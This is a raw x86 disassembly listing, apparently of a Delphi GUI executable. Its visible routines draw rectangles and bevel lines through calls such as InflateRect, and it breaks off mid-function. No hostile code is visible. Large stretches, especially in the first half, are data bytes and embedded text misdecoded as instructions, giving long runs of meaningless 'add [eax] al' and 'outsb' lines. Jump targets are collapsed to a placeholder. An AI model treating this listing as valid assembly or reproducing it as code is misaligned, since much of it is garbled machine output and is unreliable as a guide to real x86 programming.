inc edx
add [ eax + 0x10042f9 ] al
add bh ch
inc [ eax - 0x5 ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xe1149072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42e0d072
add [ eax ] dh
insb
inc ecx
add [ 0x78450800 ] al
je r-xdata
or eax [ edx ]
in al 0xe
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
sar cl 0x1
inc edx
add [ eax - 0x75 ] ch
inc ecx
add ah cl
or al [ edx ]
test [ edx + 0xba40041 ] cl
inc edx
add [ eax + 0xa ] dh
inc edx
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
push 0x6948776f
outsb
je r-xdata
inc esp
inc ebp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
popad
insb
je r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ ebx + edi * 8 + 0x42 ] dl
add [ eax + eax * 2 + 0x1a80045 ] dh
inc ebx
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
mov al [ ecx ]
dec eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23ffbd1e ] dh
loop r-xdata
inc eax
add [ eax ] al
add bh bh
or bl bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax ]
sti
imul ebp [ esi + 0x74 ] r-xdata
fld [ edx ]
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
inc ecx
add [ eax ] bh
add [ eax ] al
[ eax ]
iretd
add [ edx + eax ] ah
add [ eax ] al
adc al 0x94
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
[ eax ]
sti
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
sub_42e23a
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_42e25e
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add [ eax + eax ] dl
inc ebx
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
sbb ah bh
inc edx
add [ eax ] dl
or al 0x45
add [ eax + 0xa ] al
inc ebp
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ esi + ecx + 0x45 ] bh
add [ esi + ecx ] ah
inc ebp
add [ edx + edi + 0x57fc0045 ] bl
inc ebp
add ah dl
add [ ebx ] eax
sbb [ edi ] dh
inc ebp
add [ eax ] cl
cmp al [ ebp ]
add dh bh
inc edx
add [ edi ] al
add [ ebx ] bh
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
[ esp + edi * 8 + 0x42 ]
sub_42e3b6
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_42e90b
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xdc656c62
test [ eax + eax - 0x40 ] eax
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
xor [ eax ] 0x0
jpe r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941ea36
add [ eax ] al
inc [ ecx ]
js r-xdata
add [ eax ] al
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
pushfd
add [ eax + eax - 0x18 ] 0x0
add bh bh
call 0x241ea3a
push eax
outsd
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0030 ] al
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc edi
je r-xdata
je r-xdata
push edi
jo r-xdata
add [ eax ] al
jo r-xdata
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xb06f666e
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
add [ eax + 0x4f0d003a ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec ebp
outsd
jne r-xdata
dec edi
outsb
jb r-xdata
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax + eax - 0x50 ] 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
test [ eax + eax ] eax
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
jo r-xdata
inc edx
add [ eax ] al
jb r-xdata
sub [ ecx + 0xd80044 ] al
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc esp
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
push cs
dec edi
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
test [ eax + eax - 0x48 ] al
add [ eax ] eax
xor eax [ eax ]
add [ esi ] dl
or [ edx ] al
inc esp
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax ] dh
add eax 0x40b40043
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
add [ eax - 0x3bffbc2d ] dh
inc esp
outsd
arpl [ ebx - 0x4 ] bp
in al dx
jb r-xdata
je r-xdata
add al bl
add [ eax ] al
test [ eax + eax - 0x30 ] eax
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
outsb
inc ebp
outsb
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ ecx ] cl
dec edi
push edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add al cl
or eax 0x8a840045
inc ecx
add [ eax + ecx ] bl
inc ebx
add [ esi + eax * 8 + 0x44 ] bl
add [ eax ] dh
or [ ebx ] al
je r-xdata
inc ebp
inc ebp
inc esp
jb r-xdata
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
rol [ 0x45a00043 ] 0x45
push ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x13 ] cl
inc edx
add [ eax - 0x13 ] ch
inc edx
add [ edx + eax ] ah
add [ eax ] al
mov al 0xd3
inc ebx
add ah al
cwde
test [ eax + eax - 0x10 ] al
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x78 ] bp
in al dx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42ed ] al
sub_42ecce
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_42ee4a
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_42ee6e
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add [ esi + ecx + 0x1880044 ] bh
inc ebp
add [ eax ] ch
cmovne eax [ eax ]
sbb [ edi ] cl
inc esp
add [ eax ] dl
or al 0x45
add [ eax + 0xa ] al
inc ebp
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ esi + ecx + 0x45 ] bh
add [ esi + ecx ] ah
inc ebp
add [ edx + edi + 0x57fc0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
sub [ edi ] cl
inc esp
add [ eax + 0xb00430a ] bl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
aam 0xee
inc edx
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
hlt
sub_42f27d
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
sub_42f29e
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070025 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f090029 ] al
outsb
js r-xdata
push ebx
je r-xdata
je r-xdata
add [ eax + eax + 0x18 ] 0x1
push eax
outsd
jo r-xdata
adc al ch
hlt
jb r-xdata
add [ eax + 0x4f0b002d ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
inc ebp
loopne r-xdata
inc esp
outsd
push ebx
je r-xdata
jb r-xdata
inc esp
add [ eax ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax + eax - 0x18 ] 0x0
add bh bh
call 0x241f2e9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
dec edi
outsb
inc ebx
add al 0x89
inc ebp
in al 0x8b
inc ebp
clc
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
jb r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
fcom [ ebx - 0x75 ]
pop ebp
or [ ebx + 0x438bfc5b ] cl
or [ ecx + 0x438bf845 ] cl
add al 0x89
inc ebp
cld
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
inc ebp
outsb
inc esp
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
dec [ ebx + 0x508b0845 ]
or al 0x8b
inc ebp
or [ ebx + 0x408bf840 ] cl
adc al ch
stosb [ edi ]
dec edx
inc esp
jb r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423f2c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
je r-xdata
push edi
jo r-xdata
mov ecx 0x2
call sub_4246b4
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423f2c
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4246b4
pop ebx
mov esp ebp
pop ebp
retn
fmul [ ebx + 0x408b0845 ]
clc
lea eax [ bx + si ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
test [ eax + eax ] eax
add [ eax ] al
sub [ eax ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
sub_42f400
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423f2c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4246b4
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423f2c
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4246b4
pop ebx
mov esp ebp
pop ebp
retn
sub_42f4c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424038
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_42f400
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42f524
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454cd0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_44c948
mov edx 0x32
mov eax esi
call sub_44c96c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42f5c8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_423f2c
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_416e0c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_416e0c
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_416e0c
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_4246b4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_423f2c
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_416e0c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_416e0c
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_416e0c
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_4246b4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f6b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_423f2c
mov ecx edi
mov edx esi
mov eax ebx
call sub_424688
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_424628
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42f6f8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_424038
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_424008
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_423fec
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_423f2c
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_424328
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_424008
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_423fec
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_423f2c
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_424328
mov eax [ ebp - 0x4 ]
call sub_44cb90
push eax
mov eax [ ebp - 0x4 ]
call sub_44cbd4
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4246ec
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_42f7ea ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_416e34
lea eax [ ebp - 0x1c ]
call sub_42f5c8
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_416e34
lea eax [ ebp - 0x1c ]
call sub_42f5c8
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_416e34
lea eax [ ebp - 0x1c ]
call sub_42f5c8
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42f6b8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42f6b8
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42f6b8
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42f6b8
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42f6b8
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
